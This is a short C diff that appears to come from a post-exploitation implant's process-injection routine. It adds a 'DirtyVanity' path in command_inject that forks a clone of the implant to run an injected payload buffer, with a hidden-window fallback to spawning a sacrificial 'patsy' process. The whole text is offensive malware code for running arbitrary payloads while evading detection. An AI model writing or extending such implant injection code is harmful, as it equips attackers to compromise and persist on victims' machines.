@@ -74,6 +74,16 @@ void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 
 		startupinfo_hidden(&si, NULL);
 
+	/* 4.12 DirtyVanity: clone ourselves instead of a patsy when configured */
+	if (procinj_execute_has(PI_EXEC_DIRTYVANITY)) {
+		spawn_log("inject: dirtyvanity fork", 0x7fffffff);
+		if (inject_dirtyvanity_forkrun(buffer, length, NULL, 0)) {
+			token_guard_stop_maybe(ignoreToken);
+			return;
+		}
+		spawn_log("inject: dirtyvanity clone failed, patsy fallback", 0x7fffffff);
+	}
+
 	/* spawn our process */
 	spawn_log("inject: calling spawn_patsy x86=", (long)x86);
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
